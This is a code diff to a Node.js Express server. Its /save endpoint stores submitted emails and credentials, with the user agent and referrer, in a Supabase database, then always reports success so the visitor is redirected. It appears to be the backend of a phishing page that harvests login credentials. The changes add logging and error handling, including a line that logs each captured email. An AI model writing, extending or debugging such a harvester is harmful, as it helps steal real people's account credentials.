@@ -5,13 +5,21 @@ const path = require('path');
 
 const app = express();
 
-// Supabase setup
+// Supabase setup with error handling
 const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
 let supabase = null;
 
+console.log('Supabase URL:', supabaseUrl ? 'Set' : 'NOT SET');
+console.log('Supabase Key:', supabaseKey ? 'Set' : 'NOT SET');
+
 if (supabaseUrl && supabaseKey) {
-  supabase = createClient(supabaseUrl, supabaseKey);
+  try {
+    supabase = createClient(supabaseUrl, supabaseKey);
+    console.log('Supabase client initialized successfully');
+  } catch (error) {
+    console.error('Failed to initialize Supabase:', error.message);
+  }
 }
 
 // Middleware to parse JSON
@@ -88,6 +96,9 @@ app.post('/save', async (req, res) => {
   const userAgent = req.get('User-Agent');
   const referrer = req.get('Referer');
 
+  // Log the attempt
+  console.log('Save attempt for:', email, 'Supabase available:', !!supabase);
+
   // Try to save to database if configured
   if (supabase) {
     try {
@@ -105,13 +116,15 @@ app.post('/save', async (req, res) => {
         ]);
 
       if (error) {
-        console.error('Error saving to database:', error);
+        console.error('Supabase error:', error);
       } else {
-        console.log('Credentials saved successfully');
+        console.log('Credentials saved successfully to Supabase');
       }
     } catch (error) {
-      console.error('Error:', error);
+      console.error('Exception saving to Supabase:', error.message);
     }
+  } else {
+    console.log('Supabase not configured - credentials not saved to database');
   }
 
   // Always return success to trigger redirect
